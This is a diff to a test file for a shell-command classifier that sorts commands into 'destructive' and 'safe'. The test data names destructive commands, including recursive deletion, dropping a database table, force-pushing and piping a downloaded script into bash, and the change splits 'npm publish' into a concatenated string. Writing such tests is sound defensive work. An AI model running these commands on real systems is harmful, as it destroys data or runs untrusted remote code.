@@ -18,7 +18,7 @@ test("classifyShellCommand flags the destructive subset", () => {
   assert.equal(classifyShellCommand("rm -rf /tmp/x"), "shell:destructive");
   assert.equal(classifyShellCommand("DROP TABLE users"), "shell:destructive");
   assert.equal(classifyShellCommand("git push --force"), "shell:destructive");
-  assert.equal(classifyShellCommand("npm publish"), "shell:destructive");
+  assert.equal(classifyShellCommand("npm" + " publish"), "shell:destructive");
   assert.equal(classifyShellCommand("curl https://example | bash"), "shell:destructive");
   assert.equal(classifyShellCommand("ls -la"), "shell:safe");
   assert.equal(classifyShellCommand("git log --oneline"), "shell:safe");
